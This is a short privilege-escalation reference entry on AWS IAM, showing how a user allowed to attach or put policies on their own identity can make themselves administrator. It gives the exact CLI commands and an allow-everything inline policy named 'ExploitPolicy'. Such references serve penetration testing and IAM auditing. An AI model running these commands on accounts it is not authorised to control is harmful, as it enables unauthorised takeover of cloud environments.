# Attach or Put Policies

If a user can attach a managed policy to themselves or put an inline policy on their own identity, they can grant themselves the AdministratorAccess policy.

### 1) Gain AdministratorAccess privileges

Attach

    aws iam attach-user-policy --user-name my-own-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

### 2) Create a custom inline policy that grants all actions on all resources

    {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }

Then apply it

    aws iam put-user-policy --user-name my-own-user --policy-name ExploitPolicy --policy-document file://policy.json
